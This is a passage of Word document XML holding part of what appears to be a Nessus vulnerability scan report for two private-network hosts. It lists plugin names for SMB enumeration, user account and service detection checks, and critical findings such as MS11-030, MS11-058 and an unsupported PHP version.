          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10908 Microsoft Windows 'Domain Administrators' Group User List</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B2828FD" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">INFO N/A 10913 Microsoft Windows - Local Users </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Information :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Disabled Accounts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB933EC" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">INFO N/A 10914 Microsoft Windows - Local Users </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Information :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Never Changed Passwords</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6209BF8C" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">INFO N/A 10916 Microsoft Windows - Local Users </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Information :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Passwords Never Expire</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B063D65" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">INFO N/A 10915 Microsoft Windows - Local Users </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Information :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> User Has Never Logged In</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="296E15DF" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">INFO N/A 10897 Microsoft Windows - Users </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Information :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Disabled Accounts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F49DF1B" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">INFO N/A 10898 Microsoft Windows - Users </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Information :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Never Changed Password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5000F981" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">INFO N/A 10900 Microsoft Windows - Users </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Information :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Passwords Never Expire</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5070BCE1" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">INFO N/A 10899 Microsoft Windows - Users </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Information :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> User Has Never Logged In</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="100AD69D" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 13855 Microsoft Windows Installed Hotfixes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD7F478" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">INFO N/A 17651 Microsoft Windows </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>SMB :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Obtains the Password Policy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19CA523F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">INFO N/A 10394 Microsoft Windows SMB Log </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>In</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Possible</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01C20CA3" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10398 Microsoft Windows SMB LsaQueryInformationPolicy Function NULL Session Domain SID Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6B8336" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10859 Microsoft Windows SMB LsaQueryInformationPolicy Function SID Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139578BA" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10785 Microsoft Windows SMB NativeLanManager Remote System Information Disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68453453" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">INFO N/A 48942 Microsoft Windows SMB </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Registry :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> OS Version and Processor Architecture</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F55105" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">INFO N/A 10413 Microsoft Windows SMB </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Registry :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Remote PDC/BDC Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B320E85" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">INFO N/A 52459 Microsoft Windows SMB </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Registry :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Win 7 / Server 2008 R2 Service Pack Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A63FF20" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10428 Microsoft Windows SMB Registry Not Fully Accessible Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793F3D5F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10400 Microsoft Windows SMB Registry Remotely Accessible</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A22620C" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 11011 Microsoft Windows SMB Service Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641815A3" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>192.168.0.1 7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B02FFA9" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 23974 Microsoft Windows SMB Share Hosting Office Files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D16AA06" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 11777 Microsoft Windows SMB Share Hosting Possibly Copyrighted Material</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3985616D" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>INFO N/A 10395 Microsoft Windows SMB Shares Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF763BF" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 100871 Microsoft Windows SMB Versions Supported (remote check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49BA655C" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 106716 Microsoft Windows SMB2 Dialects Supported (remote check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ECF657F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 11219 Nessus SYN scanner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45758244" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 19506 Nessus Scan Information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48134F55" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 24786 Nessus Windows Scan Not Performed with Admin Privileges</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D7478C" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10884 Network Time Protocol (NTP) Server Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E08D45" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 11936 OS Identification</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29984784" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 48243 PHP Version Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51FC5650" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10185 POP Server Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58882037" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 66334 Patch Report</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7948C00F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10399 SMB Use Domain SID to Enumerate Users</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76FCF6BB" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10860 SMB Use Host SID to Enumerate Local Users</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61926ABA" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10263 SMTP Server Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49155915" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 96982 Server Message Block (SMB) Protocol Version 1 Enabled (uncredentialed check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5307499A" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 22964 Service Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="599F8404" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 25220 TCP/IP Timestamps Supported</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57987CF2" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10281 Telnet Server Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FFE348C" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10287 Traceroute Information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2632902A" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 11154 Unknown Service Detection: Banner Retrieval</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD162A9" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 20094 VMware Virtual Machine Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07C2F192" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10386 Web Server No 404 Error Code Check</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CBA3166" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10150 Windows NetBIOS / SMB Remote Host Information Disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E05FB35" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>192.168.0.2 8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76830255" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>192.168.0.2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AFD6E3E" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>3 7 8 2 40</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="077B01A4" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>CRITICAL HIGH MEDIUM LOW INFO</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14FA9E23" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Vulnerabilities Total: 60</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D9168F9" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>SEVERITY CVSS PLUGIN NAME</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E750480" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>CRITICAL 10.0 53514 MS11-030: Vulnerability in DNS Resolution Could Allow Remote Code Execution (2509553) (remote check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A3AA001" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>CRITICAL 10.0 72836 MS11-058: Vulnerabilities in DNS Server Could Allow Remote Code Execution (2562485) (uncredentialed check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="661929CB" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>CRITICAL 10.0 58987 PHP Unsupported Version Detection</w:t>
      </w:r>
    </w:p>
